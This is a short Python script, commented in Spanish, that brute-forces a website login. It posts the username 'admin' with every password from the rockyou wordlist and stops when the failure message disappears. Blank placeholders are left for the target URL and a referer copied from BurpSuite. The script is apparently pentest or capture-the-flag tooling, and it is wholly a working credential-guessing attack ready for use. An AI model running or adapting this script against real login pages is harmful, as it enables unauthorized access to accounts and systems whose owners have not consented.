#!/usr/bin/env python3
#coding = utf-8

#Puede que la peticion por POST de la data a tramitar (usuario y pass) cambien dependiendo de la pag web, hay que verificar desde BurpSuite como se tramita la peticion y adecuarla

import requests, re, time, sys, signal, urllib3
from pwn import *

def def_handler(sig, frame):
        print("\n[!]Saliendo...\n")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)



#Variables
main_url="http://"#Añadir link de la web del login


if __name__ == '__main__':

    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    s.keep_alive = False
    
    p1 = log.progress("Brute Force")
    p1.status("Realizando ataque de fuerza bruta")
    time.sleep(2)

    with open('/usr/share/wordlists/rockyou.txt', encoding='"ISO-8859-1"') as fp:
        for password in fp.read().splitlines():
            
            r = s.get(main_url)

            
            headers_data = {
                'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Referer' : 'http://'#añadir referer, copiar y pegar de BurpSuite
            }

            post_data = {
                'username' : 'admin', #Usuario 
                'password' : '%s'% password
            }
            
            r = s.post(main_url, headers=headers_data, data=post_data)
            p1.status("Probando la contraseña: %s" % password)
            if "Invalid username or password!" not in r.text:
                p1.success(" ✅ Contraseña valida!:%s" % password)
                sys.exit(0)


